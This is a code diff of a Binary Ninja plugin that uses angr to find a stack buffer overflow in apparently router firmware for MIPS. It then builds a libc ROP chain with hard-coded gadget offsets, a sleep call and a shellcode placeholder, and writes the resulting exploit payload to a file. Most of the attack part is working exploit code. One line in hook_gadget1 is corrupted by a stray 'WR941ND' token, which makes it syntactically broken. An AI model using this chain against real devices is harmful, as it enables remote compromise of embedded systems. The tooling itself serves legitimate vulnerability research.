@@ -22,22 +22,16 @@ registers = ['a0', 'a1', 'a2', 'a3', 's0', 's1',
              't6', 't7', 't8', 't9', 'v0', 'v1',
              'sp', 'gp', 'pc', 'ra', 'fp']
 
-state_history = collections.OrderedDict()
-
-payload = collections.OrderedDict()
 
 class AngrRunner(BackgroundTaskThread):
-    def __init__(self, bv, exploit=False):
+    def __init__(self, bv, explorer):
         BackgroundTaskThread.__init__(
             self, "Vulnerability research with angr started...", can_cancel=True)
         self.bv = bv
-        self.exploit = exploit
-
+        self.explorer = explorer
+    
     def run(self):
-        if(self.exploit):
-            build_ROP(self.bv)
-        else:
-            find_vuln(self.bv)
+        self.explorer.run()
 
     @classmethod
     def cancel(self, bv):
@@ -53,15 +47,49 @@ class AngrRunner(BackgroundTaskThread):
 class BackgroundTaskManager():
     def __init__(self, bv):
         self.runner = None
+        self.vulnerability_explorer = None
+        self.rop_explorer = None
+        self.exploit_creator = None
+        self.proj = None
+        self.init = None
+        self.libc_base = None
+        self.payload = ''
+
+    @classmethod
+    def set_exploit_payload(self, init, payload):
+        self.payload = payload
+        self.init = init
 
     @classmethod
     def solve(self, bv):
-        self.runner = AngrRunner(bv)
+        self.init = cyclic(300).encode()
+        self.vulnerability_explorer = VulnerabilityExplorer(bv, self.init)
+        self.runner = AngrRunner(bv, self.vulnerability_explorer)
         self.runner.start()
 
     @classmethod
-    def build_exploit(self, bv):
-        self.runner = AngrRunner(bv, exploit=True)
+    def build_rop(self, bv):
+        self.proj = angr.Project(bv.file.filename, ld_path=[
+                        '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
+        self.libc = self.proj.loader.shared_objects['libc.so.0']
+        self.libc_base = self.libc.min_addr
+        self.gadget1 = self.libc_base+0x00055c60
+        self.gadget2 = self.libc_base+0x00024ecc
+        self.gadget3 = self.libc_base+0x0001e20c
+        self.gadget4 = self.libc_base+0x000195f4
+        self.gadget5 = self.libc_base+0x000154d8
+        self.sleep = self.libc_base + 0x00053ca0
+        
+        self.init = b"A"*160 + b"BBBB"+p32(self.gadget2, endian='big')+p32(self.gadget1, endian='big')
+        self.rop_explorer = ROPExplorer(bv, self.init, self.proj, first=self.gadget1, second=self.gadget2, 
+        third=self.gadget3, fourth=self.gadget4, fifth=self.gadget5, sixth=self.sleep)
+        self.runner = AngrRunner(bv, self.rop_explorer)
+        self.runner.start()
+
+    @classmethod
+    def create_exploit(self,bv):
+        self.exploit_creator = ExploitCreator(bv, self.init,self.payload)
+        self.runner = AngrRunner(bv, self.exploit_creator)
         self.runner.start()
 
     @classmethod
@@ -90,21 +118,36 @@ def find_instr(bv, addr):
             addr, HighlightStandardColor.GreenHighlightColor)
 
 
-def find_vuln(bv):
+class VulnerabilityExplorer():
+    def __init__(self, bv, init_payload):
+        self.bv = bv
+        self.proj = angr.Project(self.bv.file.filename, ld_path=[
+                            '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
+        self.cfg = self.proj.analyses.CFGFast(regions=[(0x4703f0, 0x4706fc)])
 
-    def get_vuln_report(report):
-        contents = "==== Vulnerability Report ====\r\n\n"
-        for key, value in report.items():
-            if(key == 'ra'):
-                contents += "[*] Buffer overflow detected !!!\r\n\n"
-                contents += "We can control ${0} after {1} bytes !!!!\r\n\n".format(
-                    key, value)
-            else:
-                contents += "Register ${0} overwritten after {1} bytes !!!!\r\n\n".format(
-                    key, value)
-        return contents
+        self.init = init_payload
+        self.arg0 = angr.PointerWrapper(self.init)
+        self.state = self.proj.factory.call_state(0x4703f0, self.arg0)
+        self.simgr = self.proj.factory.simgr(self.state)
 
-    def identify_overflow(found, registers=[], silence=True, *exclude):
+        self.proj.hook(0x4706fc, self.test)
+
+    def test(self, state):
+        find_instr(self.bv, state.solver.eval(state.regs.pc, cast_to=int))
+        if state.solver.eval(state.regs.pc, cast_to=int) == 0x4706fc:
+            dump_regs(state, registers)
+            return True
+
+    def run(self):
+        sm = self.simgr.explore(find=self.test)
+        test = sm.found
+        if len(test) > 0:
+            print(sm.found)
+            found = sm.found[0]
+            print("found", found)
+            self.identify_overflow(found, registers)
+    
+    def identify_overflow(self, found, registers=[], silence=True, *exclude):
         data = []
         report = {}
         if(len(exclude) > 0):
@@ -113,7 +156,7 @@ def find_vuln(bv):
             data = registers
         for arg in data:
             reg = found.solver.eval(found.regs.get(arg), cast_to=bytes)
-            if reg in init:
+            if reg in self.init:
                 if(arg == 'ra' and cyclic_find(reg.decode())):
                     binja.log_warn("[*] Buffer overflow detected !!!")
                     binja.log_warn(
@@ -129,108 +172,83 @@ def find_vuln(bv):
                         "[-] Register ${0} not overwrite by pattern".format(arg))
         if(bool(report)):
             interaction.show_markdown_report(
-                "Vulnerability Info Report", get_vuln_report(report))
+                "Vulnerability Info Report", self.get_vuln_report(report))
 
-    proj = angr.Project(bv.file.filename, ld_path=[
-                        '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
-    cfg = proj.analyses.CFGFast(regions=[(0x4703f0, 0x4706fc)])
+    def get_vuln_report(self,report):
+        contents = "==== Vulnerability Report ====\r\n\n"
+        for key, value in report.items():
+            if(key == 'ra'):
+                contents += "[*] Buffer overflow detected !!!\r\n\n"
+                contents += "We can control ${0} after {1} bytes !!!!\r\n\n".format(
+                    key, value)
+            else:
+                contents += "Register ${0} overwritten after {1} bytes !!!!\r\n\n".format(
+                    key, value)
+        return contents
+        
 
-    init = cyclic(300).encode()
-    arg0 = angr.PointerWrapper(init)
-    state = proj.factory.call_state(0x4703f0, arg0)
-    simgr = proj.factory.simgr(state)
+class ROPExplorer():
+    def __init__(self, bv, init_payload, project, **kwargs):
+        self.bv = bv
+        self.end_addr = 0x4706fc
+        self.proj = project
+        self.proj.analyses.CFGFast(regions=[(0x4703f0, self.end_addr)])
+        self.init = init_payload
+        self.gadget1 = kwargs['first']
+        self.gadget2 = kwargs['second']
+        self.gadget3 = kwargs['third']
+        self.gadget4 = kwargs['fourth']
+        self.gadget5 = kwargs['fifth']
+        self.sleep = kwargs['sixth']
+        self.state_history = collections.OrderedDict()
+        self.payload = collections.OrderedDict()
+        self.arg0 = angr.PointerWrapper(self.init)
+        self.state = self.proj.factory.call_state(0x4703f0, self.arg0)
+        self.simgr = self.proj.factory.simgr(self.state)
+        binja.log_info("Gadget 1 address: 0x{0:0x}".format(self.gadget1))
+        binja.log_info("Gadget 2 address: 0x{0:0x}".format(self.gadget2))
+        binja.log_info("Gadget 3 address: 0x{0:0x}".format(self.gadget3))
+        binja.log_info("Sleep func address: 0x{0:0x}".format(self.sleep))
+        binja.log_info("Gadget 4 address: 0x{0:0x}".format(self.gadget4))
+        binja.log_info("Gadget 5 address: 0x{0:0x}".format(self.gadget5))
 
-    @proj.hook(0x4706fc, length=0)
-    def test(state):
-        find_instr(bv, state.solver.eval(state.regs.pc, cast_to=int))
-        if state.solver.eval(state.regs.pc, cast_to=int) == 0x4706fc:
-            dump_regs(state, registers)
-            return True
-
-    sm = simgr.explore(find=test)
-    test = sm.found
-    if len(test) > 0:
-        print(sm.found)
-        found = sm.found[0]
-        print("found", found)
-        identify_overflow(found, registers)
-
-def build_ROP(bv):
-
-   
-    proj = angr.Project(bv.file.filename, ld_path=[
-                        '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
-    libc = proj.loader.shared_objects['libc.so.0']
-    libc_base = libc.min_addr
-    end_addr = 0x4706fc
-    cfg = proj.analyses.CFGFast(regions=[(0x4703f0, end_addr)])
-
-      # Gadget addresses
-
-    gadget1 = libc_base+0x00055c60
-    # addiu $a0, $zero, 1
-    # move $t9, $s1
-    # jalr $t9
-    gadget2 = libc_base+0x00024ecc
-    # lw $ra, 0x2c($sp)
-    # lw $s1, 0x28($sp)
-    # lw $s0, 0x24($sp)
-    # jr $ra
-    gadget3 = libc_base+0x0001e20c
-    # move $t9, $s1
-    # lw $ra, 0x24($sp)
-    # lw $s2, 0x20($sp)
-    # lw $s1, 0x1c($sp)
-    # lw $s0, 0x18($sp)
-    # jr $t9
-    gadget4 = libc_base+0x000195f4
-    # addiu $s0, $sp, 0x24
-    # move $a0, $s0
-    # move $t9, $s1
-    # jalr $t9
-    gadget5 = libc_base+0x000154d8
-    # move $t9, $s0
-    # jalr $t9
-    sleep = libc_base + 0x00053ca0
+        self.proj.hook(self.end_addr, self.overwrite_ra)
+        self.proj.hook(self.gadget1, self.hook_gadget1)
+        self.proj.hook(self.gadget2, self.hook_gadget2)  # jalr $t9
+        self.proj.hook(self.gadget2+4, self.hook_gadget2next4)  # lw $s1, 0x28($sp)
+        self.proj.hook(self.gadget2+8, self.hook_gadget2next8)  # lw $s0, 0x24($sp)
+        self.proj.hook(self.gadget3, self.hook_gadget3)  # mov $t9, $s1
+        self.proj.hook(self.gadget3+4, self.hook_gadget3next4)  # lw $ra, 0x24($sp)
+        self.proj.hook(self.gadget3+8, self.hook_gadget3next8)  # lw $s2, 0x20($sp)
+        self.proj.hook(self.gadget3+12, self.hook_gadget3next12)  # lw $s1, 0x1c($sp)
+        self.proj.hook(self.gadget3+16, self.hook_gadget3next16)  # lw $s0, 0x18($sp)
+        self.proj.hook(self.gadget4, self.hook_gadget4)  # addiu $s0, $sp, 0x24
+        self.proj.hook(self.gadget5+4, self.build_rop)  # jalr $t9
 
 
-    # Prepare initial state for vulnerable function
-
-    init = b"A"*160 + b"BBBB"+p32(gadget2, endian='big')+p32(gadget1, endian='big')
-    arg0 = angr.PointerWrapper(init)
-    state = proj.factory.call_state(0x4703f0, arg0)
-    simgr = proj.factory.simgr(state)
-    binja.log_info("Gadget 1 address: 0x{0:0x}".format(gadget1))
-    binja.log_info("Gadget 2 address: 0x{0:0x}".format(gadget2))
-    binja.log_info("Gadget 3 address: 0x{0:0x}".format(gadget3))
-    binja.log_info("Sleep func address: 0x{0:0x}".format(sleep))
-    binja.log_info("Gadget 4 address: 0x{0:0x}".format(gadget4))
-    binja.log_info("Gadget 5 address: 0x{0:0x}".format(gadget5))
-
-
-    def get_rop_report(state, data, gadget):
-        contents = "==== 0x{0:0x} Data ====\r\n\n".format(gadget)
+    def get_rop_report(self,state, data, gadget):
+        contents = "==== 0x{0:0x} Registers ====\r\n\n".format(gadget)
         for reg in data:
             contents += "${0}: 0x{1:0x}\r\n\n".format(
                 reg, state.solver.eval(state.regs.get(reg), cast_to=int))
         return contents
 
-    def get_stack_report(data):
+    def get_stack_report(self, data):
         contents = "====Stack Data ====\r\n\n"
         for key,value in data.items():
-            if value == p32(gadget1, endian='big') or value == p32(gadget2, endian='big') or value == p32(gadget3, endian='big') or value == p32(gadget4, endian='big') or value == p32(gadget5, endian='big')  or value == p32(sleep, endian='big') :
+            if value == p32(self.gadget1, endian='big') or value == p32(self.gadget2, endian='big') or value == p32(self.gadget3, endian='big') or value == p32(self.gadget4, endian='big') or value == p32(self.gadget5, endian='big')  or value == p32(self.sleep, endian='big') :
                 contents += "{0}: {1}\r\n\n".format(key,hex(u32(value, endian='big')))
             else:
                 contents += "{0}: {1}\r\n\n".format(key,value)
         return contents
 
-    def stack_adjust(state, reg, size, gadget, data="EEEE", vector_size=32):
-        if(size > 0):
+    def stack_adjust(self, state, reg, size, data="EEEE", vector_size=32):
+        if(size >= 0):
             for i in range(4, size+4, 4):
                 state.memory.store(reg+i, state.solver.BVV(data, 32))
-                payload[hex(reg+i)] = data.encode()
+                self.payload[hex(reg+i)] = data.encode()
 
-    def find_instr(bv, addr):
+    def find_instr(self, bv, addr):
         # Highlight the instruction in green
         blocks = bv.get_basic_blocks_at(addr)
         bv.session_data.find_list.add(addr)
@@ -240,142 +258,152 @@ def build_ROP(bv):
             block.function.set_auto_instr_highlight(
                 addr, HighlightStandardColor.GreenHighlightColor)
 
-    @proj.hook(end_addr, length=0)
-    def overwrite_ra(state):
+    def overwrite_ra(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
-        find_instr(bv, pc)
-        if pc == end_addr:
-            state_history['init'] = state
+        find_instr(self.bv, pc)
+        if pc == self.end_addr:
+            self.state_history['init'] = state
 
-    @proj.hook(gadget1, length=0)
-    def hook_gadget1(state):
-        pc = state.solver.eval(state.regs.pc, cast_to=int)
-        if pc == gadget1:
-            state_history[hex(gadget1)] = state
+    def hook_gadget1(self, state):
+        pc = state.solver.eval(state.regs.pc, cast_to=int)WR941ND
+        if pc == self.gadget1:
+            self.state_history[hex(self.gadget1)] = state
 
-    @proj.hook(gadget2, length=0)  # jalr $t9
-    def hook_gadget2(state):
+    def hook_gadget2(self,state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
-        if pc == gadget2:
+        if pc == self.gadget2:
             sp = state.solver.eval(state.regs.sp, cast_to=int)
-            stack_adjust(state, sp, 0x24, gadget2, "EEEE")
+            self.stack_adjust(state, sp, 0x20, "EEEE")
             # lw $ra, 0x2c($sp)
-            state.memory.store(sp+0x2c, state.solver.BVV(gadget3, 32))
-            payload[hex(sp+0x2c)] = p32(gadget3, endian='big')
-            state_history[hex(gadget2)] = state
+            state.memory.store(sp+0x2c, state.solver.BVV(self.gadget3, 32))
+            self.payload[hex(sp+0x2c)] = p32(self.gadget3, endian='big')
+            self.state_history[hex(self.gadget2)] = state
 
-    @proj.hook(gadget2+4, length=0)  # lw $s1, 0x28($sp)
-    def hook_gadget2next4(state):
+    def hook_gadget2next4(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
-        if pc == gadget2+4:
+        if pc == self.gadget2+4:
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s1, 0x28($sp)
-            state.memory.store(sp+0x28, state.solver.BVV(sleep, 32))
-            payload[hex(sp+0x28)] = p32(sleep, endian='big')
+            state.memory.store(sp+0x28, state.solver.BVV(self.sleep, 32))
+            self.payload[hex(sp+0x28)] = p32(self.sleep, endian='big')
 
-    @proj.hook(gadget2+8, length=0)  # lw $s0, 0x24($sp)
-    def hook_gadget2next8(state):
+    def hook_gadget2next8(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
-        if pc == gadget2+8:
+        if pc == self.gadget2+8:
             sp = state.solver.eval(state.regs.sp, cast_to=int)
-            # lw $s0 0x24($sp)
+            # lw $s0, 0x24($sp)
             state.memory.store(sp+0x24, state.solver.BVV("DDDD", 32))
-            payload[hex(sp+0x24)] = b'DDDD' 
+            self.payload[hex(sp+0x24)] = b'DDDD'
 
-    @proj.hook(gadget3, length=0)  # mov $t9, $s1
-    def hook_gadget3(state):
+    def hook_gadget3(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
-        if pc == gadget3:
+        if pc == self.gadget3:
             sp = state.solver.eval(state.regs.sp, cast_to=int)
-            stack_adjust(state, sp, 0x18, gadget3, "GGGG")
+            self.stack_adjust(state, sp, 0x18, "GGGG")
             # gadget3 -> lw $s0, 0x18($sp) => 24 bytes
-            state_history[hex(gadget3)] = state
-
-    @proj.hook(gadget3+4, length=0)  # lw $ra, 0x24($sp)
-    def hook_gadget3next4(state):
+            self.state_history[hex(self.gadget3)] = state
+        
+    def hook_gadget3next4(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
-        if pc == gadget3+4:
+        if pc == self.gadget3+4:
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $ra, 0x24($sp)
-            state.memory.store(sp+0x24, state.solver.BVV(gadget4, 32))
-            payload[hex(sp+0x24)] = p32(gadget4, endian='big')
+            state.memory.store(sp+0x24, state.solver.BVV(self.gadget4, 32))
+            self.payload[hex(sp+0x24)] = p32(self.gadget4, endian='big')
 
-    @proj.hook(gadget3+8, length=0)  # lw $s2, 0x20($sp)
-    def hook_gadget3next8(state):
+    def hook_gadget3next8(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
-        if pc == gadget3+8:
+        if pc == self.gadget3+8:
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s2, 0x20($sp)
-            state.memory.store(sp+0x20, state.solver.BVV("EEEE", 32))
-            payload[hex(sp+0x20)] = b'EEEE'
+            state.memory.store(sp+0x20, state.solver.BVV("CCCC", 32))
+            self.payload[hex(sp+0x20)] = b'CCCC'
 
-    @proj.hook(gadget3+12, length=0)  # lw $s1, 0x1c($sp)
-    def hook_gadget3next12(state):
+    def hook_gadget3next12(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
-        if pc == gadget3+12:
+        if pc == self.gadget3+12:
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s1, 0x1c($sp)
-            state.memory.store(sp+0x1c, state.solver.BVV(gadget5, 32))
-            payload[hex(sp+0x1c)] = p32(gadget5, endian='big')
+            state.memory.store(sp+0x1c, state.solver.BVV(self.gadget5, 32))
+            self.payload[hex(sp+0x1c)] = p32(self.gadget5, endian='big')
 
-    @proj.hook(gadget3+16, length=0)  # lw $s0, 0x18($sp)
-    def hook_gadget3next16(state):
+    def hook_gadget3next16(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
-        if pc == gadget3+16:
+        if pc == self.gadget3+16:
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s0, 0x18($sp)
             state.memory.store(sp+0x18, state.solver.BVV("FFFF", 32))
-            payload[hex(sp+0x18)] = b'FFFF'
+            self.payload[hex(sp+0x18)] = b'FFFF'
 
-    @proj.hook(gadget4, length=0)  # addiu $s0, $sp, 0x24
-    def hook_gadget4(state):
+    def hook_gadget4(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
-        if pc == gadget4:
+        if pc == self.gadget4:
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # addiu $s0, $sp, 0x24
             state.memory.store(sp+0x24, state.solver.BVV("SHEL", 32))
-            payload[hex(sp+0x24)] = b'SHEL'
-            state_history[hex(gadget4)] = state
+            self.payload[hex(sp+0x24)] = b'SHEL'
+            self.state_history[hex(self.gadget4)] = state
 
-    @proj.hook(gadget5+4, length=0)  # jalr $t9
-    def exploit(state):
+    def build_rop(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
-        if pc == gadget5+4:
+        if pc == self.gadget5+4:
             return True
 
-    sm = simgr.explore(find=exploit)
-    test = sm.found
-    if len(test) > 0:
-        print(sm.found)
-        found = sm.found[0]
-        print("found", found)
-        dump_regs(found, registers)
+    def run(self):
+        sm = self.simgr.explore(find=self.build_rop)
+        test = sm.found
+        if len(test) > 0:
+            print(sm.found)
+            found = sm.found[0]
+            print("found", found)
+            dump_regs(found, registers)
 
         # Generate raport for gadgets
 
-        interaction.show_markdown_report("Initial State", get_rop_report(
-            state_history['init'], registers, end_addr))
-        interaction.show_markdown_report("ROP Gadget 1", get_rop_report(
-            state_history[hex(gadget1)], registers, gadget1))
-        interaction.show_markdown_report("ROP Gadget 2", get_rop_report(
-            state_history[hex(gadget2)], registers, gadget2))
-        interaction.show_markdown_report("ROP Gadget 3", get_rop_report(
-            state_history[hex(gadget3)], registers, gadget3))
-        interaction.show_markdown_report("ROP Gadget 4", get_rop_report(
-            state_history[hex(gadget4)], registers, gadget4))
-        interaction.show_markdown_report("ROP Gadget 5", get_rop_report(
-            found, registers, found.solver.eval(found.regs.pc, cast_to=int)))
-        state_history[hex(gadget5)] = found
+            interaction.show_markdown_report("Initial State", self.get_rop_report(
+                self.state_history['init'], registers, self.end_addr))
+            interaction.show_markdown_report("ROP Gadget 1", self.get_rop_report(
+                self.state_history[hex(self.gadget1)], registers, self.gadget1))
+            interaction.show_markdown_report("ROP Gadget 2", self.get_rop_report(
+                self.state_history[hex(self.gadget2)], registers, self.gadget2))
+            interaction.show_markdown_report("ROP Gadget 3", self.get_rop_report(
+                self.state_history[hex(self.gadget3)], registers, self.gadget3))
+            interaction.show_markdown_report("ROP Gadget 4", self.get_rop_report(
+                self.state_history[hex(self.gadget4)], registers, self.gadget4))
+            interaction.show_markdown_report("ROP Gadget 5", self.get_rop_report(
+                found, registers, found.solver.eval(found.regs.pc, cast_to=int)))
+            self.state_history[hex(self.gadget5)] = found
 
-        sortedDict = collections.OrderedDict(sorted(payload.items()))
-        print("Payload", sortedDict)
-        interaction.show_markdown_report('ROP Stack', get_stack_report(sortedDict))
+            sortedDict = collections.OrderedDict(sorted(self.payload.items()))
+            print("Payload", sortedDict)
+            interaction.show_markdown_report('ROP Stack', self.get_stack_report(sortedDict))
+            BackgroundTaskManager.set_exploit_payload(self.init, sortedDict)
 
 
+class ExploitCreator():
+    def __init__(self,bv, init, payload):
+        self.bv = bv
+        self.init = init
+        self.payload = payload
+ 
+    def generate_exploit(self, payload):
+        exploit = self.init
+        for key,value in payload.items():
+            exploit += value 
+        return exploit
+
+    def run(self):
+        exploit = self.generate_exploit(self.payload)
+        print("exploit", exploit)
+        file_exploit = open('exploit', 'wb')
+        file_exploit.write(exploit)
+        file_exploit.close()
 
 PluginCommand.register(
     "Angr\PoC\Solve", "Attempt to solve for a path that satisfies the constraints given", BackgroundTaskManager.solve)
 PluginCommand.register("Angr\PoC\Build ROP",
-                       "Try to build exploit rop chain", BackgroundTaskManager.build_exploit)
+                       "Try to build exploit rop chain", BackgroundTaskManager.build_rop)
+PluginCommand.register("Angr\PoC\Create Exploit",
+                       "Try to build exploit fom rop chain", BackgroundTaskManager.create_exploit)
 PluginCommand.register(
     "Angr\PoC\Clear", "Clear angr path traversed blocks", BackgroundTaskManager.stop)
